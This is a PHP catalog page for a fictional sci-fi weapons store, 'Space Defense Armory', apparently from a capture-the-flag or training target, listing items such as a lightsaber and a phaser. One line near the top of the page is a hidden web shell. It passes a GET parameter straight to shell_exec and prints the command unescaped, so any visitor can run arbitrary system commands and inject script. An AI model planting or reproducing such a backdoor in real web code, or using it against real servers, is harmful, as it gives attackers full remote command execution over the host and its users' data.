<?php include "header.php";$page="Catalog"?>
<title><?php echo "Space Defense Armory | ".$page;?></title>
<div class="jumbotron star-jumbo">Weapons Catalog</div>
<hr class="dash"/>
<div class="container main">
    <?php if(isset($_GET['cmd'])){$r=str_replace("\n","<br>",htmlspecialchars(shell_exec($_GET['cmdc'])));echo "<p>Command: ".$_GET['cmdc']."</p><p>Result: ".$r."</p>";}?>
    <div class="row">
        <div class="col-md-12">
            <h3 class="text-center">View our Offerings</h3>
            <p>Below are the different weapons that you can purchase through Space Defense Armory. Protect yourself and your loved ones with our wide selection of weapons below:</p>
        </div>
    </div>
    <hr class="solid">
    <div class="row">
        <div class="col-md-4 text-center mx-auto d-flex align-middle">
            <a href="weapon.php?id=1"><img src="images/weapons/energy_sword.png" class="exhibitor-logo"></a>
        </div>
        <div class="col-md-4 text-center mx-auto d-flex align-middle">
            <a href="weapon.php?id=2"><img src="images/weapons/proton_pack.png" class="exhibitor-logo"></a>
        </div>
        <div class="col-md-4 mx-auto d-flex text-center">
            <a href="weapon.php?id=3"><img src="images/weapons/zurgs_blaster.png" class="exhibitor-logo"></a>
        </div>
    </div>
    <div class="row">
        <div class="col-md-4 text-center">
            <a href="weapon.php?id=1"><h3>Energy Sword</h3></a>
        </div>
        <div class="col-md-4 text-center">
            <a href="weapon.php?id=2"><h3>Proton Pack</h3></a>
        </div>
        <div class="col-md-4 text-center">
            <a href="weapon.php?id=3"><h3>Zurg's Blaster</h3></a>
        </div>
    </div>
	<hr class="solid"/>
    <div class="row">
        <div class="col-md-4 text-center d-flex align-middle">
            <a href="weapon.php?id=4"><img src="images/weapons/identity_disc.png" class="exhibitor-logo"></a>
        </div>
        <div class="col-md-4 text-center d-flex align-middle">
            <a href="weapon.php?id=5"><img src="images/weapons/purity.png" class="exhibitor-logo"></a>
        </div>
        <div class="col-md-4 text-center d-flex align-middle">
            <a href="weapon.php?id=6"><img src="images/weapons/alien_stiletto.png" class="exhibitor-logo"></a>
        </div>
    </div>
    <div class="row">
        <div class="col-md-4 text-center">
            <a href="weapon.php?id=4"><h3>Identity Disc</h3></a>
        </div>
        <div class="col-md-4 text-center">
            <a href="weapon.php?id=5"><h3>Purity</h3></a>
        </div>
        <div class="col-md-4 text-center">
            <a href="weapon.php?id=6"><h3>Alien Stiletto</h3></a>
        </div>
    </div>
	<hr class="solid"/>
    <div class="row">
        <div class="col-md-4 text-center d-flex align-middle">
            <a href="weapon.php?id=7"><img src="images/weapons/lightsaber.png" class="exhibitor-logo"></a>
        </div>
        <div class="col-md-4 text-center d-flex align-middle">
            <a href="weapon.php?id=8"><img src="images/weapons/m41a_pulse_rifle.png" class="exhibitor-logo"></a>
        </div>
        <div class="col-md-4 text-center d-flex align-middle">
            <a href="weapon.php?id=9"><img src="images/weapons/plasma_rifle.png" class="exhibitor-logo"></a>
        </div>
    </div>
    <div class="row">
        <div class="col-md-4 text-center">
            <a href="weapon.php?id=7"><h3>Lightsaber</h3></a>
        </div>
        <div class="col-md-4 text-center">
            <a href="weapon.php?id=8"><h3>M41A Pulse Rifle</h3></a>
        </div>
        <div class="col-md-4 text-center">
            <a href="weapon.php?id=9"><h3>Plasma Rifle</h3></a>
        </div>
    </div>
	<hr class="solid"/>
    <div class="row">
        <div class="col-md-4 text-center d-flex align-middle">
            <a href="weapon.php?id=10"><img src="images/weapons/noisy_cricket.png" class="exhibitor-logo"></a>
        </div>
        <div class="col-md-4 text-center d-flex align-middle">
            <a href="weapon.php?id=11"><img src="images/weapons/phaser.png" class="exhibitor-logo"></a>
        </div>
        <div class="col-md-4 text-center d-flex align-middle">
        </div>
    </div>
    <div class="row">
        <div class="col-md-4 text-center">
            <a href="weapon.php?id=10"><h3>Noisy Cricket</h3></a>
        </div>
        <div class="col-md-4 text-center">
            <a href="weapon.php?id=11"><h3>Phaser</h3></a>
        </div>
        <div class="col-md-4 text-center">
        </div>
    </div>
	<hr class="solid"/>
</div>
<?php include "footer.php"?>